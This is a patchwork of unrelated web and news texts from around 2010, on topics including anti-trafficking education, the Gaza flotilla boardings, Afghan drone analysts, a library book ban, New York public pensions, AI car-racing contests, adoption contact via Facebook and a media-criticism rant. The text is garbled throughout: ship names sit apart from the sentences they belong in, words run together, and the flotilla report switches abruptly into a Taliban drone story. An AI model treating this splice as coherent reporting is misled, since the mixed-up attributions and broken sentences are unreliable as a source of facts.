If we are to stop this crime , we have to teach them about human trafficking from the earliest age so that they do not become victims " .
Anima is the head girl of the class .
Standing tall in front of her classmates , she urges them to recite in chorus a short poem in the local language .
The poem centres around the heinous crime of human trafficking and how children are vulnerable but not helpless to act .
In addition , Anima explains to the class that " we should refuse to speak to strangers , especially men .
If he offers us sweets and lures us with tales of a good life , we should report this to our elders or the police .
Traffickers lure children like us .
We are sold to brothels , sexually exploited and abused .
We are forced to work in houses and factories with no food and no money .
This is not what we want .
We want to be educated and aware . "
The room fills up with claps .
" The children are always the best teachers , " adds the headmaster .
He believes they are in a good position to help spread information on these issues and raise awareness among the whole community .
Such initiatives , where life - saving messages are built into the education curriculum , help children grow safely and wisely in a world fraught with danger .
UNODC and Action against Trafficking and Sexual Exploitation of Children India , a network of non-governmental organizations working to prevent human trafficking , support this initiative under the UNODC project on prevention of human trafficking , with contribution from the United States Agency for International Development .
Human trafficking in South Asia is often referred to as one of the fastest growing transnational organized crimes .
Over 150,000 people are trafficked in the region every year for sex work , labour , forced marriages and organ trade .
Countries in South Asia , including Bangladesh , serve as prominent origin , transit and destination countries for women , children and men being trafficked .
In South Asia , the largest numbers of women trafficked are within or from the region , and child trafficking is a major concern .
With a rise in demand for domestic help in the cities , families from rural villagers often willingly turn their children over to middlemen who promise a better life in the cities .
In addition to supporting local initiatives by non-governmental organizations , UNODC also provides technical assistance and financial assistance to projects aimed at preventing and prosecuting human trafficking in the region .

The defense establishment is considering allowing future aid ships to sail into the Gaza Strip after their crews first agree to dock in Ashdod Port and undergo a military inspection to ensure that they are not carrying weaponry , officials said Saturday night .
Mavi Marmara
The idea was one of several being “ floated around ” as Israel searches for a new policy to handle future flotillas in the wake of the international criticism it has been facing since Monday ’s takeover of the .
Commandos from the navy ’s Flotilla 13 – known as the Shayetet – came under attack from a group of mercenaries aboard the ship and killed nine of them .
RELATED :
Senior diplomatic sources said Saturday night that “ nothing has beendecided ” but “ there are a lot of ideas out there . ”
At the same time , one official said , the principle that Israel will not allow uncheckedcargo into the Gaza Strip will not change .
He stressed that Israel has no problem letting civilian materials intoGaza , including cement – if they are intended for a clearly earmarkedhumanitarian project , and are monitored by an international agency .
Israel , the official said , was “ willing to explore new ideas , ” but atthe same time was intent on keeping the naval blockade in place .

On Saturday , commandos boarded thecargo ship as it made its way to the Gaza Strip in an attempt to breakthe Israel - imposed sea blockade .
Navy forces then piloted the ship intoAshdod Port where its cargo will be unloaded and allowed , afterinspection , to cross by land into the Gaza Strip .
Rachel Corrie
The boarding took place without any violence and was carried out by seaand not by helicopters , like on Monday .
Passengers aboard the– named for an American activist killed by an IDF bulldozer in the GazaStrip in 2003 – even , according to the IDF , threw the boarding soldiersa rope off the side of the vessel .

Prior to the takeover , three navy ships tailed the aid boat for severalhours throughout the morning , a few dozen kilometers from the blockaded Strip .
The army said it had contacted the boat four times and urged itspassengers to divert to Ashdod , but that the passengers had refused .
Rachel Corrie
Eleven passengers were aboard the , including Nobel Peace Prize laureate Mairead Maguire and Denis Halliday , a former United Nations assistant secretary - general .
Rachel Corrie
Thewas carrying20 tons of paper , 550 tons of cement , 100 tons of high - end medicalequipment including electric wheelchairs , hospital beds , a CAT scanmachine and dental equipment as well as fabric and thread .
Netanyahu :
We respect the right to express different opinions
Prime Minister Binyamin Netanyahu , meanwhile , was updated throughoutthe day on Saturday about the situation with the boat .
He issued astatement after the boat was brought into the Ashdod Port , saying that “ we saw today the difference between a boat with peace activists , withwhom we do not agree but whose right to express their differentopinions we respect , and a boat of hate organized by violent extremistsand terrorist supporters . ”
Netanyahu said that Israel operated in the same way with each of thedifferent boats in order to implement the naval blockade to prevent thesmuggling of arms to Hamas and to enable civilian goods to be broughtinto Gaza after being checked .
He said that Israel would continue tomaintain its right to self - defense and “ not allow the establishment ofan Iranian port in Gaza . ”
The Free Gaza movement , which organized the flotilla , announcedSaturday that it planned to send additional ships to break the blockadein the coming months .
Another message , referring to a Taliban compound , warned : “ fire coming from cmpnd . ”
The Marines responded by strafing the fighters , killing nine of them .
Lieutenant Christopher and her crew might be fighting on distant keypads instead of ducking bullets , but they head into battle just the same every day .
They and thousands of other young Air Force analysts are showing how the Facebook generation ’s skills are being exploited  and paying dividends  in America ’s wars .
The Marines say the analysts , who are mostly in their early to mid-20s , paved the way for them to roll into Marja in southern Afghanistan earlier this year with minimal casualties .
And as the analysts quickly pass on the latest data from drones and other spy planes , they are creating the fluid connections needed to hunt small groups of fighters and other fleeting targets , military officials say .
But there can be difficulties in operating from so far away .
Late last month , military authorities in Afghanistan released a report chastising a Predator drone crew in an incident involving a helicopter attack that killed 23 civilians in February .
Military officials say analysts in Florida who were monitoring the drone ’s video feed cautioned two or three times in a chatroom that children were in the group , but the drone ’s pilot failed to relay those warnings to the ground commander .
For the most part , though , the networking has been so productive that senior commanders are sidestepping some of the traditional military hierarchy and giving the analysts leeway in deciding how to use some spy planes .

A special thanks to friend and colleague Nick Roesler for this collection , you will find all UFO documents from the Gerald Ford Presidential Library .

I am certain that taking issue with a fellow Psychology Today author in my very first post for this Web site is a gross violation of PT blogger etiquette .
So I 'm going to go ahead and to my editors in advance and cross my fingers that they do n't hit the kill switch on this blog before anyone has a chance to visit .
But rather than waste your time with small talk about who I am and why I 'm here , let me go ahead and say I respectfully disagree with Nigel Barber and his post " Why atheism will replace religion , " which appeared recently on his excellent PT blog , The Human Beast .
I respectfully disagree with him a lot .
I do not disagree with Dr. Barber because I doubt his data showing patterns of waning belief and churchgoing around the world and his hypotheses about their causes , because I do n't , although I 'm certainly aware of competing theories .
I also do not disagree with him because I am myself religious , because I 'm not ; in fact , I could be a living , breathing statistic in the studies he cites .
I disagree with him because I 've seen the emotional and nourishment that most human beings get from their faith and I do n't see anything taking its place .
As long as that 's the case , I believe we do ourselves a disservice if we assume that the only reason it exists is because certain people have yet to evolve beyond it .
Psychology Today has given me the opportunity to continue this intellectual and emotional journey , and I could n't be more excited .
In this blog , I 'll be writing about the allure of religion for people like my brother , who was raised the same way I was and yet chose to become a Christian at the age of 17 .
I 'll be writing about the millions of Americans who say they have no religion , most of whom do n't classify themselves as atheists and many of whom ultimately end up back in church .
I 'll be writing about how religion influences , one of the life events that brings the unchurched to church , some for the first time .
And I 'll be writing about the role of faith in American society and the free market that is constantly enlivening organized religion even as it is withering away elsewhere .
Dr. Barber is right that , statistically speaking , a decline in religious activity has coincided with modernity in many societies , including this one .
And yet he is not the first , nor will he be the last , to conclude based on such data that religion 's days are numbered .
My is that this assumption will lead to ignore the reality of how important religion remains today , in America and around the world .
I worry that it will cause people to caricature those for whom it still is relevant as less intelligent , less modern , less important .
I do n't believe that , and I definitely do n't want my children to believe that .
If they are going to understand the world , they need to understand religious belief , and that requires engagement with and for people who have it .
It also requires , dare I say , an to the fact that science does n't yet satisfy every one of our needs .
In my lifetime , I 've seen a polarization of our country -- and my family -- along religious lines .
I 'd like to see those lines start to blur and for people on both sides to start looking for common ground .
That wo n't settle the question of whether humanity will ultimately be guided by faith or by reason .
But it might make life a little more tolerable while my kids and I are here .

American free speech organisations are fighting a decision by a New Jersey school to remove a critically acclaimed anthology of writing about teenage homosexuality from library shelves after parents described it as vulgar and obscene .
Revolutionary Voices , a collection of stories , poems and artwork by young homosexuals , was banned at Rancocas Valley Regional High School last week following a campaign by the local chapter of Glenn Beck 's conservative 9.12 project .
Local grandmother and 9.12 member Beverly Marinelli told the Philadelphia Inquirer that the book was " pervasively vulgar , obscene , and inappropriate " , while insisting that she is " not a homophobe " .
But a coalition of free speech groups has jumped to the book 's defence , saying that residents " have no right to impose their views on others or to demand that the contents of the library reflect their personal , religious , or moral values " .
" There are undoubtedly GLBTQ [ gay , lesbian , bisexual , transgendered , and questioning ] students at Rancocas Valley High School , regardless of whether they are openly recognised .
Removing any of these titles would send a clear message to those students that they are the objects of social disapproval – different , vulnerable , and marginal – whose needs for information of particular relevance to their lives are not respected , " wrote the directors of a collection of organisations to the school 's board .
The letter , the signatories to which include the National Coalition Against Censorship , the National Council of Teachers of English , American Booksellers Foundation for Free Expression , the Association of American Publishers and PEN America , added that there was " no question that these books are not obscene " .
" No one has to read something just because it's on the library shelf , " the letter continued .
" No book is right for everyone , and the role of the library is to allow students to make choices according to their own interests , experiences , and family values ...
Even if the books are too mature for some students , they will be meaningful to others . "
Lambda Legal , a US civil rights group representing gays , lesbians , and people with HIV / Aids , has also written to the school board saying that removing the book " undermines the school 's obligation and ability to protect students regardless of sex , sexual orientation , or gender identity " .
The book 's editor , Amy Sonnie , pointed to a letter from a 15 - year - old boy , who said that on reading the volume he was relieved to discover " that there were other people out there who shared elements of my identity " .
" Queer students may not feel safe speaking up when LGBTQ books are challenged , " said Sonnie .
" But , they certainly deserve a chance to discover the ' diversity of voices ' that make balanced library collections so crucial for the health of our communities and democracy . "
The Philadelphia Inquirer reported that the local 9.12 group is now looking to get the same book removed from the Lenape regional high school district , the county 's largest school district .
But the paper said that students were " shrugging off " the controversy .
" Just because these books are in the library is n't going to cause us to be gay , " they said .
" We have so much access to information , if we want to read something we 'll read it . "

Millions of North Koreans listen to dozens of foreign radio broadcasts transmitted by Japan , South Korea and the U.S. , and the number is growing .
This is according to Peter Beck , a nonresident senior fellow at the Atlantic Council , who said that it is quite a phenomenon given that Pyongyang authorities distribute only radios with fixed dials , block foreign broadcasts , and imprison citizens caught listening to foreign radio for as long as 10 years .
Beck , who is also a Pantech research fellow at Stanford University 's Asia Pacific Research Center , said that two of the most pop ular stations are Voice of America which broadcasts news from the U.S. and around the world , and Radio Free Asia which focuses on the communist regime and the lives of defectors in the South .
Beck added that the North Korean regime is losing its monopoly on the control of information and outside broadcasts are undermining loyalty to the leadership .
And you think YOU have problems .
The baby from Eraserhead is getting a run for it 's money ....
Since its original launch in the early ' 90s , Firaxis ' Civilization franchise has been a touchstone series for PC gamers , offering a very specific and rich historical vein of historical simulation and creative , strategic gameplay .
As times change , the team still hopes to provide an experience congruent with fans of the series while pulling it in new creative directions , as Dennis Shirk , producer for Sid Meier 's Civilization V , explains in this interview .
After nearly three years in development , with a team of 52 at Firaxis , the developer has begun to highlight different elements of the PC strategy game for the public as part of its publicity -- but they are n't all there is to it , as Shirk explains .
As Shirk discusses in this in - depth Gamasutra interview , development of a title like this with a huge in - built fan base is both an opportunity ( to make the most of the creative possibilities ) and a responsibility ( to serve that huge contingent of fans . )
Series like Civilization are becoming increasingly rare in this industry , in that it is enough of an institution that you can afford to spend several years working on it at Firaxis , rather than developing it every year or shuffling it around studios .
That means that every release has to last a long time .
How do you approach the scope of change to the design in that context ?
Dennis Shirk : Well , Jon Shafer , our lead designer , has been in the Civilization fan community and playing Civilization since Civilization II on up .
He created mods for Civilization III .
He 's been creating a lot of the scenarios , and acted as a designer for Civilization IV : Beyond the Sword .
He 's only 26 or so , right ?
DS : Yeah .
He 's our local wunderkind .
He does amazing stuff , and is a huge fan of history .
One of his influences on Civ V , actually , is [ SSI 's 1994 wargame ] Panzer General .
It 's just a favorite game from when he was a kid .
Whenever we ship a game , a faction of the team is always going to say , " That was really neat , but what if we did this ? "
It always happens .
When you 've got a foundation , like what we have with the Civilization series as a whole , there are so many things that you can build on top of it , so many things that you want to do , even after you 've shipped something that you think is ultimately cool and complete .
There 's always something else that you can do .
A lot of it comes down to one of Sid 's cornerstones .
When you 're actually going through and designing an entirely new game , he came up with his 33/33/33 rule .
It 's 33 percent new , 33 percent improved , and 33 percent what everybody already expects to be there .
I think Jon , under his tutelage , has followed along with that .
It seems like these days , Sid 's influence is more in that role of establishing the attitude and framework and tone , more than actually having day - to - day input on the project .
Is that roughly the case ?
DS : I would n't say it 's day - to - day , but it 's still very frequent .
Sid , just because his fingers are in everything at Firaxis , has input and interest everywhere , especially in the Civilization series .
We have a young designer like Jon who is excellent at everything he does , but even he needs help .
Even Sid needs help sometimes .
There are regular meetings every week between the designers and the team .
Sid is always playing the game and giving his input .
He 's just instrumental in everything we do .
He can look at a game , play for five minutes , and automatically pinpoint if something 's not quite going to work over a five - hour session .
He 's just really good at it , so I would say Sid 's always got his hands pretty thoroughly in everything .
He 's in that executive producer role .
DS : Yes .
It almost seems like the James Bond franchise , where you have some continuity in the top - level leadership , but the actual director changes from entry to entry , ever since Civ II when Brian Reynolds was a primary designer .
DS : Definitely .
Everybody brings their different unique flavor to the game .
I think a lot of people see Civ IV as the pinnacle so far .
But whereas it seems like that game refined its predecessor to a high degree , Civ V seems more like a break in a lot of ways .
Even the fundamental tileset system is changing .
Is this game more of a fork in the road to Firaxis ?
DS : It is , it is .
We wanted to try some very large things .
Combat [ in Civ ] is traditionally seen as working a certain way .
Everybody expects it to work a certain way throughout the whole of Civilization 's history .
That was one area where Jon said , " You know what ?
This is something none of the designers have ever really paid attention to , in terms of doing something completely different and new . "
He saw it as an opportunity to put a whole new layer on .
That 's when we got tactical combat into the game .
It 's scary in a lot of ways for a lot of our fans to see that , just as it was when Civilization IV was first announced .
People were demanding we hang [ Civ IV designer ] Soren Jonson .
It was really bizarre .
A lot of players read the previews that are coming out now for Civ V , and they 're like , " I do n't understand how this applies to Civ IV , " because they 've been playing Civ IV for so long .
They 're not sure how to integrate this into that game .
That 's not what we 're doing .
We 're trying to go in a completely different direction , while still keeping that core gameplay that has come in all Civilization games .
I look around our beautiful home , cluttered with the many papers , mail and computer equipment that make up our life now .
I am over taken by the crisp fragrance of a simple vase of flowers that have been artfully arranged by talented loving hands that you bring so regularly .
We are nourished by the fresh foods and lunches you happen by with .
But , mostly I believe the simple fact that you take the time from your crazy busy schedule to make room for these things is most nourishing to our hearts .
It means so much to us , further words would simply lessen the value .
Each time the thought of the daunting 2 hour drive to a Doctors appointment or Chemo comes to mind , you always have the plans in place to manage the day for us .
My mind spins when I imagine the drive on our own .
But , you are always there for us at the drop of a hat ; it is so appreciated .
Even the things that are out of control , like our plumbing having a problem or an ice maker on the fritz , you manage in your genius mind to get the matter resolved by putting your thoughts in action .
We are continuously amazed by you both !
I guess what this little letter boils down to is this ; we love you and adore you both .
You are so special to us !
We really are fortunate to have you touching our lives ( not like that Ted ) .
“ The measure of our love for you is immeasurable . ”
The New York State constitution bars public employers from slowing the rate at which workers build up their pensions over the course of their careers .
That degree of protection contrasts sharply with the private sector , where companies can generally change the rate at which workers build their benefits at any time .
Furthermore , as companies have reduced pensions substantially over the last two decades , states and cities have embellished theirs with sweeteners like inflation adjustments and lower retirement ages that appealed to unions and their members , who vote .
Police and other safety workers are in many cases allowed to retire with full pensions after 20 years .
Other workers can often do so after 30 years , even as young as 55 , although future hires in New York will have to work to age 62 to get their full benefits , under a law passed in January .
Census data from 2008 show that the typical state or municipal pension is substantially richer than the typical company pension — $ 15,941 versus $ 7,904 — for retirees aged 65 and older .
By tradition , public employees have said they accepted lower salaries in exchange for better benefits , but the Census data show this has not been true for a number of years .
In 2008 the median pay for a worker in the private sector was $ 39,877 , compared with $ 45,124 for a state or local employee .
The data show broad national aggregates that do not try to compare similar occupations .
And , while companies must adhere to uniform federal guidelines about setting aside money to pay pensions , states do not .
Some , like New Jersey , have failed to fund their pensions for years and have fallen so far behind they may never catch up again .
New York City and New York State have been more diligent about contributing the required amounts each year — but the required amounts now turn out to have been too low , in part because they counted on solid investment returns that have not materialized .
In Yonkers , contributions to the state pension fund keep rising .
This year , to save money , the city is proposing to eliminate about 90 police jobs , out of 640 .
The savings , though , will not even cover the extra cost of the overtime - enriched pensions .
Meanwhile , the police say the layoffs will make the situation worse , because shrinking the police force means those who remain must work even more overtime , driving up pension costs even more .
An online , searchable database compiled by The Times contains the names and pensions of about 3,700 public retirees in New York who receive more than $ 100,000 a year .
Information was provided by New York State ’s two big pension plans , one for teachers and the other for other state and local workers outside New York City .
Four of New York City ’s five big pension funds also provided data .
But the city police pension fund listed the six - figure amounts being collected by 536 retired police officers without giving their names .
The pension plan for the city ’s firefighters has yet to provide the information , as required by public information law .
President Obama addressed the graduates at West Point Academy on Saturday , saying , " Adversaries want to divide us , but we are united by our support for you - soldiers who send a clear message that this country is both the land of the free and the home of the brave . "
His comments about the wars in Afghanistan and Iraq and the threats of terrorism received applause from the graduates , but Fox News apparently did n't like it !
Filmmaker Michael Moore posted the Fox video on Twitter , which features what seems to be an edited pause , making it look like Obama was met with silence when he said the country is poised to end the war in Iraq this summer .
However , Michael Moore is n't exactly the most unbiased reporter .
Watch the Fox version for yourself :
The original is on the White House 's website .
So , is the above version edited , or was it just an innocent TV glitch , like that one time Sean Hannity used crowd shots of Glenn Beck 's 9/12 protest to make a different GOP health care rally appear more heavily attended ?

We are pleased to announce the start of the 2010 Simulated Car Racing Championship , an event
joining three simulated car racing competitions held at : ACM GECCO - 2010 , Portland ( USA ) , July 7th - 11th
IEEE WCCI - 2010 , Barcelona ( Spain ) , July 18th - July 23rd
IEEE CIG - 2010 , Copenhagen ( Denmark ) , August 18th - August 21st The Goal
The goal of the championship is to design a controller for a racing car that will compete on a set
of unknown tracks first alone ( against the clock ) and then against other drivers .
The controllers
perceive the racing environment through a number of sensors that describe the relevant
features of the car surroundings , of the car state , and the game state .
The controller can perform
the typical driving actions ( clutch , changing gear , accelerate , break , steering the wheel , etc. )
New Features
The 2010 Championship introduces several innovations in comparison with the 2009 edition : the range of the proximity sensors have been increased from 100 m to 200 m
the position of the range finders can be customized by users
new focus sensor provides accurate sensing of the road ahead
noise is introduced to range and proximity sensors
drivers now control the clutch
a new warm - up stage allows drivers to learn about track properties before the qualifying Previous competitors can enter the competition with only small additional effort since the 2010
APIs are very similar to the ones used for the 2009 edition .
Rules and Regulations
TThe championship consists of nine races on nine different tracks divided into three legs , one for
each conference , involving three Grand Prix competitions each .
Teams will be allowed to submit
a different driver to each leg .
Each Grand Prix consists of three stages : the warm - up , the
qualifying , and the race .
During the warm - up , drivers race alone to collect useful information about the tracks and tune
their behaviors .
During the qualifying , drivers races alone on the tracks ; the eight fastest drivers
participate in the main race .
The main event consists of eight three lap races on each of the
three tracks .
At the end of each race , the drivers are scored using the F1 system .
The driver
performing the fastest lap in the race will get two additional points .
The driver completing the
race with the smallest amount of damage will also get two extra points .
As in the previous edition , the tracks used in each leg are unknown to the competitors .
Championship Legs
Each leg will focus on a specific track type and will involve a dierent number of laps : American Leg ( GECCO - 2010 ) , three motor speedways and 50 laps .
Formula Leg ( WCCI - 2010 ) , three technical ( F1 - like ) tracks and 15 laps .
Dusty Leg ( CIG - 2010 ) , three dirt tracks ( non-asphalt streches and bumps ) and 25 laps .
Important Dates American Leg ( GECCO - 2010 ) : Submission deadline June 27th 2010
Conference : July 7th - 11th 2010 Formula Leg ( WCCI - 2010 ) : Submission deadline : July 7th 2010

We are pleased to announce the GECCO - 2010 Demolition Derby Competition .
The Goal
The goal of Demolition Derby is simple : wreck all opponent cars by crashing into them without
getting wrecked yourself .
To provide spectacular and entertaining non-stop action , Demolition Derby takes place on a
very small circular track ( surface : asphalt , length : 640 m , width : 90 m , number of laps : 1000 ) and
includes special changes in comparison to the regular racing competition : 1 . The range of the 36 opponent sensors has been increased to 300m .
2 . Cars do not take any damage when colliding with walls .
3 . Cars do not take any damage in the front when colliding with each other .
4 . Cars do take the doubled amount of damage in the rear when colliding with each other .
5 . The last car standing is declared winner of the match .
All racing controllers participating in Demolition Derby have to qualify for the final showdown
match by competing with each other in preliminary 1 - vs - 1 - matches .
The best eight controllers
then fight each other at the same time in the final match .
The last car standing in the final match
is declared Winner of the GECCO - 2010 Demolition Derby Competition .
Rules and Regulations
The competition is split into two phases : the preliminary 1 - vs - 1 - matches and the final
all - vs - all - match of the best eight controllers .
In the preliminary 1 - vs - 1 - matches , every controller drives against every other controller , one at
a time .
After each match , the car with less damage is declared winner and earns one point .
The
sum of points earned in all 1 - vs - 1 - matches determines a controller 's ranking .
Each match has a
maximum duration of 15.000 ingame timesteps ( 5 min simulated time ) .
The best eight controllers according to this ranking compete with each other in the final
all - vs - all - match .
All eight controllers are placed on the track at the same time and , therefore , have
to deal with multiple opponents at once .
Every time a car gets wrecked , the damage of all other
cars is reset to zero .
Winner is the last car standing in the final match , ranking of the other seven cars is determined by
the sequence of retirement .
Important Dates
There will be two Demolition Derby competitions , one at GECCO - 2010 ( Genetic and Evolutionary
Computation Conference ) and another at CIG - 2010 ( Symposium on Computational Intelligence
and Games ) :
GECCO -2010 Submission deadline : June 27th 2010
Conference : July 7th - 11th 2010 CIG - 2010 Submission deadline : August 8th 2010
Conference : August 18th - 21st 2010 Competition Software

Human - Competitive Results : 7th Annual HUMIES
Awards Oral presentations : Friday 9 July , 10:40 - 12:20 , Salon D .
Awards presentation : 8:30 - 10:10 , Oregon Ballroom Prizes Totaling $ 10,000 to be Awarded Award prizes are sponsored by Third Millennium On - Line Products Inc .
Techniques of genetic and evolutionary computation are being increasingly applied to difficult real - world problems ?
often yielding results that are not merely interesting and impressive , but competitive with the work of creative and inventive humans .
Starting at the Genetic and Evolutionary Computation Conference
( GECCO ) in 2004 , prizes were awarded for human - competitive results that had been produced by some form of genetic and evolutionary computation in the previous year .
Humie finalists will give short oral presentations about human - competitive results that they have produced by any form of genetic and evolutionary computation ( e.g. , genetic algorithms , genetic programming , evolution strategies , evolutionary programming , learning classifier systems , grammatical evolution , etc. ) .
Cash prizes of $ 5,000 ( gold ) , $ 3,000 ( silver ) , and bronze ( either one prize of $ 2,000 or two prizes of $ 1,000 ) will be awarded for the best entries that satisfy the criteria for human - competitiveness .

The natural parents of adopted children are increasingly using Facebook and other social networking sites to track down their offspring , flouting the usual controls and safeguards .
Adoption agencies are reporting huge numbers of calls from " deeply distressed " adoptive parents whose children have been contacted out of the blue .
Jonathan Pearce , chief executive of Adoption UK , said it was having to deal with the consequences of this " intrusive and unplanned communication " , and warned that it was becoming more difficult to guarantee confidentiality to adoptive parents and their children .
At the moment , official contact in adoption is most often made through the " letterbox " process .
The adoptive parents send the birth family a letter and photos every year via a social worker or adoption agency intermediary .
If the birth parent wants to respond , they also have to go through this route .
However , Facebook and other social networking sites have changed all this .
Any scrap of information – a name , location or date of birth – can help biological parents track down their children .
But the agencies warn that the existing rules protect often extremely vulnerable children .
Where once adoption tended to involve a young , single woman giving up her unplanned baby , now two - thirds of adopted children have been removed because their parents abused or neglected them .
In many cases , the birth parents dispute the removal , blaming social services .
One message sent to a child given up some years ago for adoption read : " Hello , I 'm your birth father .
I have been searching for you ever since you were stolen by social services .
You look beautiful .
I love you so much . "
Another read : " Darling son , I am so happy because I have found you here .
I have been looking for ages .
Please write back because you 've been told lies about me . "
Many local authorities are now advising adoptive parents not to include photographs in their annual letters , in case these are posted online in an attempt to trace the child .
In a report to be broadcast on Channel 4 News tonight , one adoptive mother said a message to her daughter from the biological mother had had a catastrophic impact on the family .
The adoptive mother , who cannot be identified , said : " Our daughter , who is our prime concern , has gone from no contact from her birth family , at the hands of whom she had a difficult start in life , to suddenly finding they are there at the press of a button . "
Her daughter had just turned 16 when she received the message in February .
She is due to sit her GCSEs shortly , but her adoptive mother said she had gone through a whole range of emotions and that it had " completely thrown her " .
The natural mother failed to acknowledge why her daughter had been removed from the family at the age of seven .
" She was subjected to abuse and neglect over a long period of time , " said her adoptive mother .
" But none of that is being acknowledged now . "
In another case , a teenage girl was contacted by her biological mother who , in turn , put her in touch with her birth father .
The girl was unaware that the man had sexually abused her when she was a young child .
The report also cites the case of the adoptive father of one teenage boy who went to meet his birth father after contact was made through Facebook .
The boy had been removed from his family because of severe physical abuse when he was a baby .
There are no reliable estimates of how many children have been contacted using social networking sites .
But agencies are so concerned that next month the British Association for Adoption and Fostering is to send out new guidance to social workers and adoptive parents .
Dr John Simmonds , the BAAF 's director of policy , research and development , said the guidelines recognise that Facebook and other social networking sites are here to stay .
" We will have to build them into the fabric of our adoption practice and re-emphasise the importance of children knowing why they were placed for adoption and the circumstances of the birth parents , " Dr Simmonds said .
" There is nothing we can say to the social networking sites . "
Chris Smith , whose children were adopted seven years ago , said he uses social networking sites to " follow them through life " , although he has not sent any messages .
Smith , who believes his children were unfairly adopted , said he wanted to know about their wellbeing .
The annual letter does not tell you about their health or interests , he said .
" Because I know where they are , I can just sit and see some of the photos of their school and of events and know they are doing OK , " he explained .
Some agencies now ask birth parents to sign contracts prohibiting them from using social networking sites to make contact .
The adoptive mother to whom the Observer spoke said that when she contacted social services for advice they told her to stop their daughter from using social networking sites .
" I told them that I did not believe I could do that because she would run away .
I can cut back some contact , but not all , " she said .
Normally the girl would not have been able to meet her biological family until she was 18 .
Because of the unexpected contact , her adoptive family is being forced to explore the option of a formal meeting with the birth parents .
The mother said this was " far from ideal " , but the " genie was out of the bottle " .
■ Facebook is expected to introduce changes to its privacy settings as early as this week following attacks by regulators and campaign groups , who claim it has failed to ensure users ' privacy .
Those briefed at Facebook 's headquarters in the US say the company is to introduce a " master control " that would simplify users ' privacy settings .
Users would then be able to choose which groups of people they wished to share information with – everyone , friends of friends or just friends .
This would replace the current automatic system that shares users ' information with third parties and has been criticised for being over - complicated and confusing .

Around a thousand people marched through Dublin tonight to protest against the bail out of the banks .
When the march reached the gates of the Dail a group went through the gates where they were attacked by Gardai with batons .
The march had been called by the SWP / Right To Work campaign and had achieved the backing of the UNITE union ( whose regional secretary is a SWP member ) .
It had also managed to get Fintan O'Toole , a high profile journalist , as a speaker at the start of the march along with speakers from the Community sector which has been targeted with viscous cuts .
The weather was brutal with downpours just before and during the march but all the same around 1000 people took part .
When the march reached the gates of the Dail a group went through the gates where they were halted just a couple of meters inside the entrance .
Gardai then attempted to push them out but when this failed they drew batons and attacked the crowd with at least three nasty head injuries being reported .
Once the Gardai violence had forced the protesters to retreat the gates of the Dail were closed and locked .
No arrests were being reported as of the end of the demonstration .
Segment from the Vincent Brown show that shows most of the scuffle ( from about 2 minutes in ) and also segments of the speeches and an interview from the march .

Unwittingly , the prestigious men of letters at the Columbia Journalism Review have discovered a few reasons why the newspaper industry is dying .
The overriding motif in a recent issue of CJR is the angst felt by newspaper reporters as their industry shrivels into a black hole .
A staff editorial called “ More Than a Job ” weeps :
Losing any job can be traumatic , and we are not suggesting that this emotional toll is unique to journalism …
O ! But they are .
The suffering of a downsized journalist , you see , has grandiloquence and pathos .
As CJR informs us …
The job is a calling ; the mission is to try to improve small corners of the world .
What twaddle ( h/t Parsifal ) .
Are n’t we all trying to “ improve small corners of the world ” by trudging through the existential nausea of being ?
The fact that Downsized Factory Worker With 5 Kids does n’t broadcast his struggle to captive readers makes his loss even more noteworthy .
The joy of irrelevance
The problem with newspapers and newspaper personnel may run deeper than dead trees and antiquated business models .
Many aging journalists lack skills outside the inverted pyramid .
Strangely , they seem proud of it .
Exhibit A
Journalist Don Terry was laid off by the Chicago Tribune .
These days , he ’s a CJR “ Encore Fellow . ”
Terry regales us with his personal tale of woe , one dotted with references to Lou Grant .
( Yes , the Lou Grant TV show .
In committing the sin of Pop Culture Reference , Terry opts for “ hopelessly outdated ” rather than just “ dated . ” )
Since getting laid - off / axed / downsized / right - sized / fired last February from the Chicago Tribune , where I worked as a staff writer for eight years , I ’ve downloaded and watched almost every episode of the first three seasons of the old Lou Grant television show on my iPod Touch .
It helps me sleep .
That passage is electric , full of immediacy and a sense of “ now , ” is n’t it ?
Admittedly , I ’m being an asshole .
Terry has no duty to appeal to young readers , and honestly , I ’d rather he reference Lou Grant than “ royale with cheese . ”
But , as a sage chronicler of the human condition ( cue laugh track ) , Terry has a forum — and a privilege — to offer the world something timeless .
Naturally , he sabotages that privilege with pop culture gimmickry and a narrative style that feels as dated as his Lou Grant reference .
Soapbox of the Web triumphalist
If journalism adhered to my rules , the following edict would roar through the halls of every J- school :
Pop culture , by nature , is ephemeral and fleeting ;
Pop culture references are poor narrative tools ; and Pop culture references that only Baby Boomers understand are pure shit .
More from
Terry , though , as he weaves drunkenly between self - indulgence and Lou Grant :
Lou confronts his star reporter , Joe Rossi , about his demeaning attitude toward an older colleague , a veteran cop reporter desperately trying to stay on the wagon and in the business .
“ You do n’t like Driscoll , do you ? ” “ He ’s a dinosaur , ” Rossi says .
“ It ’s all over .
Whatever happened for him was over a long time ago . ”
“ I ’m a dinosaur , ” Lou says .
Rossi does n’t say anything .
“ It would be nice if you argued the point , ” Lou says .
More silence from Rossi .
Lou grabs his arm .
“ It would be smart if you argued the point , ” he says , pointedly .
Can you feel the allegorical wonder ?
Terry is a dinosaur too , but he can teach these “ new media ” whippersnappers a few things .
Sigh …if only he gave a damn .
Quitters never win , and winners never …
… languish proudly in a weird shame spiral .
O!
This fast - paced world has no use for the ennobling waters of my gruff wisdom .
Today ’s hatchlings can’t change a typewriter ribbon , much less hammer out a sports brief with the requisite 5 Ws! Despair !
Calamity !
Twaddle again .
Maybe
Terry is n’t Web savvy , but so what .
He was beating deadlines long before Pip Tweetcock won his first Lord Snowden trophy .
That ’s worth something , is n’t it ?
Yes , reader !
I ’d say it is !
Look at Roger Ebert , practically at death ’s door — the man tweets like a hummingbird and writes long - form blog posts .
Millions read him in an age of instant gratification .
Perhaps there is hope for Don Terry .
Exhibit B
Encore Fellow No. 2 is Terry McDermott , late of the Los Angeles Times .
Unlike Terry No. 1 , Terry No. 2 embraces nouveaux médias .
He articulates what many of us feel :
I hated the conventions that bound daily journalism , the stilted , odd language in which it was written as well as the contrived structures into which that odd language was shaped .
The common newspaper style is so heavily codified you need a Berlitz course to interpret it .
More than formal , the style is abstract and artificial .
Agreed .
Thanks for understanding , Terry No. 2 . Please share your notes with the other Encore Fellows .
( BTW , McDermott is Irish for “ free from envy . ” )
Exhibit C
Closing time
It ’s last call at Typo ’s , a fictional pub I just invented to add color and charm to this drab narrative .
Typo ’s is a putrid shitscape where journalists go to die .
Naturally , that ’s where I find Jill Drew ( ex- Washington Post ) .
She ’s drinking Singapore Slings and heckling the piano player .
Big Jim Tucker sits to her left .
